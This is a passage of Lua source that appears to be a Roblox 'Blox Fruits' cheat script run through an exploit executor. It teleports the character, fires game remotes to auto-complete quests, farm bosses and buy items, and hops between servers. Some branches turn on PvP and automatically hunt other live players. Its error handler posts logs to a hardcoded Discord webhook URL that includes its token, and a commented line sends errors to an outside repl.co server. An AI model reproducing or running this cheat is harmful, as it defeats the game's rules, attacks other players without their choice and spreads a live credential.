						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)

						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
  end

elseif CheckSea(3) and c().Process['Soul Guitar'] and type(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")) == "table" then 
  for _a_a_a_a, _a_a_a_b in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")) do 
    if _a_a_a_b == false then
      if _a_a_a_a == "Swamp" then
      set("Soul Guitar 2nd Quest [Swamp]")
          _a_a_a_c = 
          {
            "Living Zombie [Lv. 2000]", 
            "Living Zombie"
          }
          to(getMobLoadPos(_a_a_a_c[2])) 
          for ______a, ______b in pairs(getsortedmon()) do 
            if ______b.Name == _a_a_a_c[1] then 
              while skidymf(______b) do
                BringMob(______b)
                click = true 
                to(______b.HumanoidRootPart.CFrame*CFrame.new(0,35,0))
              end 
            end 
          end
      elseif _a_a_a_a == "Gravestones" then 
         set("Soul Guitar 3rd Quest [Gravestones]")
            	_____temp = {
										  Placard7 = "Left",
										  Placard6 = "Left",
										  Placard5 = "Left",
										  Placard4 = "Right",
										  Placard3 = "Left",
										  Placard2 = "Right",
										  Placard1 = "Right",
										}
										
										for _a_a_a_d, _a_a_a_e in pairs(_____temp) do
										  fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"][_a_a_a_d][_a_a_a_e].ClickDetector)
										  task.wait(.2)
										end
      elseif _a_a_a_a == "Ghost" then 
         set("Soul Guitar 4st Quest [Ghost]")
  			   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
  			   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
         elseif _a_a_a_a == "Trophies" then 
           set("Soul Guitar 5st Quest [Trophies1]")
    	     for _a_a_a_f, _a_a_a_g in pairs(game:GetService("Workspace").Map["Haunted Castle"].Tablet: GetChildren()) do 
    	       if _a_a_a_g:FindFirstChild"ClickDetector" and _a_a_a_g.Line.p.Y < -999 then 
    	         fireclickdetector(_a_a_a_g.ClickDetector)
    	         task.wait(.2)
    	         end 
    	     end
        end
    end 
  end 


               elseif  CheckSea(2) and rengokustat3  then
               
                  local ayumimimimi = CheckBoss"Awakened Ice Admiral [Lv. 1400] [Boss]"
                  set"Feeding Awakened Ice Admiral [Lv. 1400] [Rengoku/Phoeyu]"
                  repeat wait()
                print (0)
                to(getKillVector3(ayumimimimi.HumanoidRootPart.CFrame))
                print (1)
                     click = true
                     stuff(ayumimimimi)
                    
                  until not skidymf(ayumimimimi)
               elseif  CheckSea(2)  and waterkeystuff   then
                  local ayumimimimi = CheckBoss"Tide Keeper [Lv. 1475] [Boss]"
                  set("Feeding "..ayumimimimi.Name.." [Daigrock]")
                  repeat wait()
                  warn(0)
                     to(getKillVector3(ayumimimimi.HumanoidRootPart.CFrame))
                     click = true
                     stuff(ayumimimimi)
                 
                  until not skidymf(ayumimimimi)
                  if not checkitem"Water Key" and getPlayerLevel() > 1500  then
                    noti"Hop For Water Key"
                     HopServer() wait(9999)
                  end
               elseif  CheckSea(1) and getPlayerLevel() > 200 and not checkitem("Saber") and game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide and c().Process["Saber"]  then
                  set"Doing Saber Quest"
               
                  if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide  then
                  
                     for r, v in next, game:GetService("Workspace").Map.Jungle.QuestPlates:GetChildren() do

                        if v:IsA("Model")  then

                           if v.Button:FindFirstChild("TouchInterest") then
                              pcall(function ()
                                wait(1)
                              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Button.CFrame
                              end)
                           end
                        end
                     end


                  elseif   game:GetService("Workspace").Map.Desert.Burn.Part.Transparency == 0  then
                     --set("Doing Saber Quest 2: Firing Door On Desert")
                     if not checkitem("Torch")  then
                        to(game:GetService("Workspace").Map.Jungle.Torch.CFrame)
                     else
                       repeat wait()
                        EquipWeaponName("Torch")
                        to(CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587, -1.28799094e-09, 0.761243105, -5.70652914e-10, 1, 1.20584542e-09, -0.761243105, 3.47544882e-10, -0.648466587))
                        until not checkitem"Torch"
                     end


                  elseif  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan") ~= 0  then
                     --set("Doing Saber Quest 3: Killing Mob Leader [Boss]")
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","GetCup")
                     EquipWeaponName("Cup")
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","FillCup",game:GetService("Players").LocalPlayer.Character.Cup)
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan")


                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == nil  then
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")


                  elseif  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 0 and not checkitem"Relic"  then
                     repeat wait()
                        local v68 = CheckBoss("Mob Leader [Lv. 120] [Boss]")
                        if v68  then
                           repeat wait()
                        
                              to(v68.HumanoidRootPart.CFrame*CFrame.new(0,35,5))
                              click = true
                              stuff(v68)
                       
                           until not skidymf(v68)
                           click = false
                        end
                     until game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 or checkitem"Relic"
                     

                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 and game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide   then
                    -- set("Doing Saber Final Quest: Using Relic")
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")
                     EquipWeaponName("Relic")
                   repeat wait()
                     to(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-09, 0.481375456, 2.53851997e-08, 1, -5.79995607e-08, -0.481375456, 6.30572643e-08, 0.876514494))
                      until not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide or not checkitem"Relic"
                  end
               elseif  CheckSea(1) and CheckBoss("Saber Expert [Lv. 200] [Boss]") and getPlayerLevel() > 199 and not checkitem("Saber") and not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide  then
             
                 
                  local v60 = CheckBoss("Saber Expert [Lv. 200] [Boss]")
                  set("Feeding Saber Expert [Saber]")
                  if v60  then
                     repeat wait()
                
                        to(getKillVector3(v60.HumanoidRootPart.CFrame))
                        stuff(v60)
                        click = true
                   
                     until not skidymf(v60)
                     click= false
                  end


               elseif  CheckSea(1) and getPlayerLevel() > 725 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~=
                  0  then
                     set"Doing Dressrosa Quest"
                     if not checkitem("Saber") and not CheckBoss("Saber Expert [Lv. 200] [Boss]")  then
                        set("Hop For Reason: Missing Saber, Hopping For Requirements")
                        HopServer() wait(9999)
                        return
                     end
                     set("Doing 2nd Sea Quest")

                     if game.Workspace.Map.Ice.Door.CanCollide  then
                        if

                        not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") and

                        not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Key")
                         then
                           if
                           (CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359).Position -
                           game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 5
                            then
                              game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("DressrosaQuestProgress", "Detective")
                              EquipWeaponName("Key")
                           else
                              to(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359), false)
                           end
                        else
                           EquipWeaponName("Key")
                           if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key")  then
                              to(game.Workspace.Map.Ice.Door.CFrame)
                           end
                        end


                     elseif  not game.Workspace.Map.Ice.Door.CanCollide  then
                        local v67 = CheckBoss("Ice Admiral [Lv. 700] [Boss]") if v67  then
                           repeat wait()
                            
                              to(getKillVector3(v67.HumanoidRootPart.CFrame))
                              stuff(v67)

                              click = true
                        
                           until not skidymf(v67)

                           click = false
                           repeat wait() until not TeleportSea(2)
                           end
                        end
 
                     elseif   CheckSea(1) and getPlayerLevel() < 725 and getPlayerLevel() > 60 and game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter")  ~=  "I don't have anything for you right now. Come back later." and c().Process["Hunter Quest"]  then
                        if not dimemi  then grhsksjehjrjdjdjsks = os.time() end
                        dimemi = true
                        set"Doing Player Hunter Quest"
                      
                        st = 1
                        local v6 = game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter")
                        if v6 ~= "I don't have anything for you right now. Come back later."  then
                           if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible  then
                              local dicac2 = string.gsub(string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Defeat ", ""), " %p(0/1)%p", "")
                              dicac = game.Players[dicac2]

                              if dicac and not blocked[dicac.Name]  then

                                 if dicac:FindFirstChild"Data" and dicac.Data.Level.Value > 20 and dicac.Character.Humanoid.MaxHealth < (game.Players.LocalPlayer.Character.Humanoid.Health + (getPlayerLevel()*1.4)*2) then
                                    dimemi = false

                                    set("Skip Level: "..dicac.Name)
                                    starttime = os.time()
                                    iseltrulcool = false
                                    repeat game:GetService"RunService".Stepped:Wait() 
                                      pcall(function ()
                                --       jrjdbdhdjks, eieiksghrjdks = pcall(function()
                                    dmlockskill = dicac.Character.Head.Position
                                         stuff()
                                       if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible  then
repeat wait (1)
                                          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")

                                          starttime = starttime + 1 until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible or starttime > 50
                                          end

                                          to(dicac.Character.HumanoidRootPart.CFrame+(alskdbwbhsh or Vector3.new(0,0,0)))
                                       --    if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].Z.Cooldown.AbsoluteSize.X < 5 or game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].X.Cooldown.AbsoluteSize.X < 5  then
--                                              alskdbwbhsh = Vector3.new(0,0,0) 
--                                           else
--                                              alskdbwbhsh = Vector3.new(math.random(-4, 4),math.random(-4, 4),math.random(-4, 4))
--                                            
--                                            tls = os.time()
--                                              
--                                              
--                                              
--                                           end
                                          spawn(function ()
                                          if lp:DistanceFromCharacter(dicac.Character.HumanoidRootPart.Position) < 10  then
                                             iseltrulcool = true
                                             down"Z" down"X"
                                          else
                                             if not iseltrulcool  then
                                                starttime = os.time()
                                             end
                                          end 
                                          end)
                                        end)
                                       until  not dicac.Character:FindFirstChild"Head" or  os.time()-starttime > 30 or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible or game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible
dmlockskill = false
                                       blocked[dicac.Name] = true
                                       
                                    else
                                       blocked[dicac.Name..tostring(math.random(83848,27277282727278485))] = true

                                   
                                    end
                                
                                 end

                           end 
                        end 
                          
                       if  dimemi and (os.time()-grhsksjehjrjdjdjsks) > 3  then 
                 
                           HopServer()
                           return 
                           end
                              elseif (CheckSea(2) and c().Process["V3 Race"] and getPlayerBeli() > 2000000 and not moctui(3) and table.find(backi, whatismyrace())  and ( (whatismyrace() == "Human" and (not pork or throughcheck(pork, 0, CheckBoss))))) and uable["FlamingoAccess"]then 
                             set("Doing V3 Race Quest ")
                         
                             local wtf = whatismyrace()  
                             sh() 
                             if wtf == "Human" then 
                
                               pork = {
                                   ["Fajita [Lv. 925] [Boss]"] = false,
                                   ["Jeremy [Lv. 850] [Boss]"] = false,
                                   ["Diamond [Lv. 750] [Boss]"] = false 
                                   
                                 } 
                                 for i, v in pairs(pork) do 
                             
                                   if v == false and CheckBoss(i) then 
                           
                                     inside = CheckBoss(i)
                                     repeat task.wait() 
                                 
                                       to(getKillVector3(inside.HumanoidRootPart.CFrame)) 
                                       stuff(inside)
                                       click = true 
                                      
                                     until not skidymf(inside) 
                                     click = false 
                                  
                             
                                       pork[i] = true 
                                      -- glgsshjdjrj = (glgsshjdjrj or 0  ) +1
                                       
                                 
                                         
                                         UpV3()
                                         
                                       
                                   else 
                                     noti("Waiting For Boss: "..tostring(i))
                           
                                   end
                                 end
                                 
                                 
                             elseif wtf == "Angel" then 
                               sh()
                               local skidderso1vn = luoiquanenskidxdxdxd() 
                               if not skidderso1vn or #skidderso1vn < 1 then 
                                 HopServer() 
                               end 
                               for snack, potato in pairs(skidderso1vn) do 
                                   repeat game:GetService"RunService".Stepped:Wait()
                                       jrjdbdhdjks, eieiksghrjdks = pcall(function()
                                         
                                    dmlockskill = potato.Character.Head.Position
                                         stuff()
                                       if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible  then
repeat wait ()
                                          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")

                                          starttime = starttime + 1 until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible
                                          end

                                          to(potato.Character.HumanoidRootPart.CFrame+(alskdbwbhsh or Vector3.new(0,0,0)))
                                          if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].Z.Cooldown.AbsoluteSize.X > 5 
                                         then 
                                           alskdbwbhsh = Vector3.new(0,40,0)
                                           else
                                             alskdbwbhsh = Vector3.new(0,0,0) 
                                         repeat wait() until not game.Players.LocalPlayer.Character.Busy.Value
                                        wait(.1)     
                                             
                                             
                                          end
                                         
                                         
                                        
                                          if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].X.Cooldown.AbsoluteSize.X > 5  then
                                             alskdbwbhsh = Vector3.new(0,40,0)
                                          else
                                             alskdbwbhsh = Vector3.new(0,0,0) 
                                           
                                           
                                             repeat wait() until not game.Players.LocalPlayer.Character.Busy.Value
                                        wait(.1)     
                                             
                                             
                                          end
                                          
                                          if lp:DistanceFromCharacter(potato.Character.HumanoidRootPart.Position) < 10  then
                                             hirimiihubontopxd = true
                                             down"Z" down"X"
                                          else
                                             if not hirimiihubontopxd  then
                                                starttime = os.time()
                                             end
                                          end

                                      
                                       end)
                                        
                                   until not potato or not potato.Character or not potato.Character:FindFirstChild"Humanoid" or not potato.Character:FindFirstChild"Head" or not skidymf(potato.Character) or  os.time()-starttime > 150 or game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible or checkNotify"player" or moctui(3)
                                     dmlockskill = false
                                 end
                             elseif wtf == "Rabbit" then 
                               for i, v in pairs(game.Workspace:GetChildren()) do 
                                 pcall(function ()
                                   to(v.CFrame)
                                 end) 
                                 sh()
                                 if moctui(3) then break end 
                                 end
                             end
                       if  dimemi and (os.time()-grhsksjehjrjdjdjsks) > 3  then 
                
                           HopServer()
                           return 
                           end
                        elseif  fruitspawn() and c().Fruit["Auto Loot Spawn Fruit"] and not CheckIsRaiding()  then 
                         
                           set("SpawnFruit Tweening")
                           fw = fruitspawn()
                          
                     
                              game.Players.LocalPlayer.Character.Humanoid:MoveTo(fw.Handle.CFrame.p)
                              to(fw.Handle.CFrame)
                        elseif   CheckSea(2) and getPlayerLevel() > 1500 and uable["FlamingoAccess"] == nil and get1mfruit() == false and not AutoRaid and not CheckIsRaiding() and c().Process["Hop For Swan Quest"] and (os.time()- timelol) > c().Process["Delay On Server While Swan Hop"]  then

                           set("Hopping For Reason: Missing 1M+ Fruit, Hop")
                           wait(2)
                           if not not AutoRaid and not CheckIsRaiding()  then
                              HopServer() wait(9999)
                           end
                           HopServer() wait(9999)
                        elseif CheckSea(2) and getPlayerLevel() > 1100 and  not uable["FlamingoAccess"]  and get1mfruit() then
                   
                        
                           set"Give 1M+ Devil Fruit For Trevor [Swan Quests]"
                           loadfruit(get1mfruit())


                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","1")
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","2")
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","3")

                        elseif   CheckSea(2) and getPlayerLevel() > 1100 and uable["FlamingoAccess"] and CheckBoss"Don Swan [Lv. 1000] [Boss]" and zqp  == nil  then
                      
                           local v54 = CheckBoss"Don Swan [Lv. 1000] [Boss]"
                           set("Feeding "..v54.Name.." [Swan Quests]")
                           if v54  then
                              repeat wait()
                              
                                 to(getKillVector3(v54.HumanoidRootPart.CFrame))
                                 click = true
                                 stuff ()
                             
                              until not skidymf(v54) or not CheckIsRaiding() or not AutoRaid
                              click = false
                           end
                        elseif  CheckSea(2) and getPlayerLevel() > 1500 and zqp == 0 and cls_7  then
                           game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress","Check")
                           game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress","Begin")

                           v53 = CheckBoss("rip_indra [Lv. 1500] [Boss]")
                           set("Feeding "..v53.Name.." [3rd Sea]")
                           if v53  then
                              repeat wait()
                      
                                 to(getKillVector3(v53.HumanoidRootPart.CFrame)) click = true
                                 stuff ()
                             
                          
                              until not skidymf(v53)
                              click = false
                           end

                          
                           elseif  CheckSea(1) and getPlayerLevel() <= 60  then

                              st = 2
                              Mob = "Shanda"
                              Mob2 = "Shanda [Lv. 475]"
                              pcall(function ()
                                
                              to(getMobLoadPos(Mob)+Vector3.new(0,50,0))
                              end)
                              
                              for i, v in pairs(getsortedmon()) do
                                 if v.Name == Mob2  then
                                    stuff(v)
                                   
                                    repeat wait()
                                       BringMob(v)
                                    
                                       to(getKillVector3(v.HumanoidRootPart.CFrame))
                                      
                                       click = true
                                       
                                    until not skidymf(v) or st ~= 2
                                    click= false
                                 
                                    click = false
                                 end
                              end 
                        
                           elseif  CheckSea(2)  and BartiloProgress == 3 and c().Process["V2 Race"] and  getPlayerBeli() > 700000 and not
                             
                             
                             moctui(2) and ((game.Workspace:FindFirstChild"Flower1" and workspace.Flower1.Transparency ~= 1) or checkitem"Flower 1") and not checkitem"Flower 3"  then
                              set"Auto Doing Evolution Quest [Race V2]"
                              game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
                              game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2")
                              pcall(function ()
                              if not checkitem"Flower 1"  then
                                 to(Workspace.Flower1.CFrame)


                              elseif  cls_6  then
                                 pcall(function ()

                                 to(Workspace.Flower2.CFrame)
                                 end)

                              elseif  not checkitem"Flower 3"  then
                                 pcall(function () to(getMobLoadPos"Swan Pirate"*CFrame.new(math.random(0,50),math.random(0,80),math.random(0,50)))end)
                                 for dk, fj in pairs(getsortedmon()) do
                                    if fj and fj.Name == "Swan Pirate [Lv. 775]"  then
                                       repeat wait()
                                      
                                          to(getKillVector3(fj.HumanoidRootPart.CFrame))
                                          click= true
                                          stuff(fj)
                                          BringMobChoosen = fj
                                          BringMob(fj)
                                         
                                       until not skidymf(fj) or checkitem"Flower 3"
                                       click = false 
                                       wait(.3)
                                      
                                    end
                                 end

                              end
                              end) 
                              
                              
                           elseif  getBossCanKill()[4]  then
                        
                              local v99 = getBossCanKill()
                              
                              set("Feeding "..v99[1].Name.." [Questable Boss]")
                              if v99 and v99[4]  then
                                 if v99[1] and v99[4]  then
                                    if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible  then
                                       if not string.find(
                                       v99[1].Name, (game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text):gsub("%s*Defeat%s*(%d*)%s*(.-)%s*%b()", "%2") )  then
                                          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                     
                                       else
                                          repeat wait()
                                         
                                             stuff(v99[1])
                                             click = true
                                             to(getKillVector3(v99[1].HumanoidRootPart.CFrame))
                                     
                                          until not skidymf(v99[1])
                                          click = false
                                       end
                                    else
                                       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                       "StartQuest",
                                       tostring(v99[2]["QuestName"]),
                                       v99[2]["QuestId"]
                                       )
                                    end
                                 end
                              end
                          
                           elseif  eltrul["Superhuman"] > 399 and eltrul["Death Step"] > 399 and eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] > 399 and eltrul["Sharkman Karate"] > 399 and not checkMelee"Godhuman" 
                             and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman") == "You seem strong. Bring me 20 Fish Tails, 20 Magma Ore, 10 Dragon Scales and 10 Mystic Droplets."  then
                          
                               buyMelee"ElectricClaw"
                             grggrgrggrgrgrggr = {

                            ["Fish Tail"] = 20,

                            ["Magma Ore"] = 20,
                            ["Dragon Scale"] = 10,
                            ["Mystic Droplet"] = 10
                        } 
                      print(0)
                         for l, g in pairs(grggrgrggrgrgrggr) do 
                           print(l, CheckMaterialCount(l), g)
                             if CheckMaterialCount(l) < g then 
                               if l == "Fish Tail" then
                                 
                                 print(3)
                                 MaterialMob={"Fishman Raider [Lv. 1775]","Fishman Captain [Lv. 1800]"} 
                                 set"Farming Until Reach 20x Fish Tail"
                                 TeleportSea(3)
                               elseif  l == "Magma Ore"  then 
                                 MaterialMob={"Magma Ninja [Lv. 1175]"} 
                                 set"Farming Until Reach 20x Magma Ore"
                                 TeleportSea(2)
                               elseif  l == "Dragon Scale"  then 
                                 MaterialMob={"Dragon Crew Archer [Lv. 1600]","Dragon Crew Warrior [Lv. 1575]"}; 
                                 set"Farming Until Reach 10x Dragon Scale"
                                 TeleportSea(3)
                               elseif  l == "Mystic Droplet"  then 
                                 set"Farming Until Reach 10x Mystic Droplet"
                                 MaterialMob={"Water Fighter [Lv. 1450]","Sea Soldier [Lv. 1425]"}; 
                                 TeleportSea(2)
                                end
                                 repeat wait() 
                            
                                   
                                   for i, v in pairs(workspace.Enemies:GetChildren()) do
                                       if table.find(MaterialMob, v.Name)  then
                     print(4)
                                         click = true 
                                         BringMob(v)
                                        repeat wait() 
                                     print(5)
                                            to(getKillVector3(v.HumanoidRootPart.CFrame))
                                            stuff(v)
                                        
                                        until not skidymf(v)
                                        click = false
                                       end
                                   end
                          
                                     print(getMobLoadPos(MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", "")), MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", ""))
                                     to(getMobLoadPos(MaterialMob[math.random(1, #MaterialMob)]:gsub(" %pLv. %d+%p", "")))
                                   
                                 until CheckMaterialCount(l) >= g
                               end
                         end  
                             elseif c().ChestFarm and gnc() then 
                               set("Auto Chest")
                              
                                local chst = gnc()
                               
                                to(chst.CFrame)
                              pcall(function() 
                                if game.Players.LocalPlayer:DistanceFromCharacter(chst.Position) < 10 then
                                firetouchinterest(chst, game.Players.LocalPlayer.Character.PrimaryPart, 0) 
                                firetouchinterest(chst, game.Players.LocalPlayer.Character.PrimaryPart, 1) 
                                end
                                end)
                              
                             elseif  CheckSea(3) and ((checkitem"God's Chalice" and CheckMaterialCount"Conjured Cocoa" > 9) or (getPlayerLevel() > 2449 and c().Process["Auto Katakuri While Maxed"]["Enable"] and getPlayerFragments() < c().Process["Auto Katakuri While Maxed"]["Until"]) or checkitem"Sweet Chalice")  then
               set"Auto Farm Katakuri After Max" 
                if c().Process["Auto Hop"].Enable and os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end
       
               spawn(function ()
                 game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc") 
                 EquipWeaponName"Sweet Chalice"
                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner") 
                 end)
                 isloaded2=false
                 for i, v in pairs(getsortedmon()) do 
                   if table.find(MobsCakePrince, v.Name) and skidymf(v)  then 
                     isloaded2=true
                     
                         BringMob(v)
                     click = true
                     repeat wait() 
                  
                         to(getKillVector3(v.HumanoidRootPart.CFrame)) 
                         stuff (v)
                         
               
                       until not skidymf(v)
                     click = false
                   end
                 end
                 
                 if not isloaded2  then 
                   
                   pcall(function() 
                     to(CFrame.new(-1820.0634765625, 210.74781799316406, -12297.49609375))
                   end) 
                 end
                 
                elseif not checkitem"God's Chalice" and not checkitem"Sweet Chalice" and hophophop then 
                           HopServer() 
                             elseif  CheckSea(3) and getPlayerLevel() > 2449 and c().Process["Auto Bone While Maxed"]["Enable"]  then 
                               set"Auto Bone While Maxed"
                         isloaded = false
                         if c().Process["Auto Hop"].Enable and os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end
                             for i, v in pairs(getsortedmon()) do 
                    
                               end
                             for i, v in pairs(getsortedmon()) do 
                               if v and skidymf(v) and table.find(BoneMobs, v.Name)  then
                                 isloaded = true 
                                 BringMob(v)
                                 click = true 
                                 repeat wait ()

                                     to(getKillVector3(v.HumanoidRootPart.CFrame))
                                     stuff(v)
                                 
                                 until not skidymf(v)
                                 end
                             end  
                             if not isloaded  then 
                   spawn(function() 
                     
                     to(CFrame.new(-9504.8564453125, 172.14292907714844, 6057.259765625))
                   end)
                   
                   end
                             elseif  not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible and not AutoRaid  then 
                           set"Level Farm" 
                           if c().Process["Auto Hop"].Enable and os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem"Sweet Chalice" then 
                             HopServer() 
                             return; 
                             end 
                           local check155 = tick()
                         
if getPlayerLevel() > 725 and CheckSea(1) then 
  TeleportSea(2) 
  end
if getPlayerLevel() > 1500 and (moctui(3) or not table.find(backi, tostring(lp.Data.Race.Value))) and (checkitem"Rengoku" or not c().Process["Force Rengoku"]) then 
  
  TeleportSea(3) 
end 

if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible  and os.time()-(check156 or os.time()) < 30 then
    local questTitle = game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text
    local mobName = questTitle:gsub("%s*Defeat%s*(%d*)%s*(.-)%s*%b()", "%2")
    local check156 = os.time() 
    
    if mobName == (MobDual2 or "").."s"  then
        local checkMob = 0
        for _, skull in ipairs(getsortedmon()) do 
          
            if skull.Name:gsub(" %pLv. %d+%p", "") == MobDual2  and skidymf(skull) then 
              local check172 = skull.Humanoid.Health
             
                click = true
               
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (skull.HumanoidRootPart.CFrame+Vector3.new(3,35,5))
       
            end
        end
          
        for _, skull in ipairs(getsortedmon()) do
            if skull.Name:gsub(" %pLv. %d+%p", "") == MobDual2  and skidymf(skull) then
                checkMob = 1
                
                
                local click = true
                local check1, check2 = os.time(), skull.Humanoid.Health
                
                repeat
                    task.wait()
                       
               
                            stuff (v)
                            to(getKillVector3(skull.HumanoidRootPart.CFrame))
                            BringMob(skull)
                 
                     
                        
              
                until not skidymf(skull) or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible or (os.time() - check1 > 1 and skull.Humanoid.Health >= check2) or not mobName == MobDual2.."s" 
                
                click = false
            end
        end
        
        if checkMob == 0  then
            pcall(function() 
             
                to(getMobLoadPos(MobDual2)+Vector3.new(0,30,0))
            end)
        end
    else
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
    end
else 
  
    GetQuest()
end


                              end
                      --warn("Delay From This Thread: "..tick()-oti)
                         --  end)
             --    pcall(function () noti("Eslaped Time: "..tostring(os.time()-reach2))
              end, function (...) 
              mii = {...} 
              miii = mii[1]
              
              writefile("conmemaydi.txt",(readfile("conmemaydi.txt") or " ").. "\n"..(miii or " cant log").." | "..(tostring(m1) or "no").." | "..(tostring(m2) or "no"))
                         warn(...) 
                         spawn(function ()
                         PostWebhook("https://discord.com/api/webhooks/1148250879070310531/eOkXIZsij1FxJaEJHLfZaUvzWgD2NtMZa64HUeslwBcXPA7mwrc2DjfnlP9A2Y9MihiD", buglog(miii))
                         end)
               end)
          --   noti("Total Delay: "..os.time()-oldtimetime.."s")
                         --  if not ayu  then warn(mee) noti("Founded Error, Sending To Server...")
                          --   game:HttpGet("https://php-web-server.akishino1.repl.co?err="..mee or "cant catch error".."&un=")end 
                        
--                       timerun = 0
                    
            end end)
                      
spawn(function ()
  while not ggggggggggg or wait(3600*2) do 
    ggggggggggg = true
    for i, v in pairs(c().Fruit.Snipe) do 
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")

                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", v) 
    end  
  end 
end)
                      
                       spawn(function ()
                        while task.wait() do  
                            pcall(function ()
                 waid1:SetText( m1 or "none")
                 waid2:SetText(m2 or "none"  )
                 
                            end)  
            
            gayz, z = pcall(function()
              if checkitem"Fire Essence" then 
                buyMelee"DragonTalon"
              end
              
              
                if getPlayerLevel() >= 2449 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk","Buy")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual Katana")
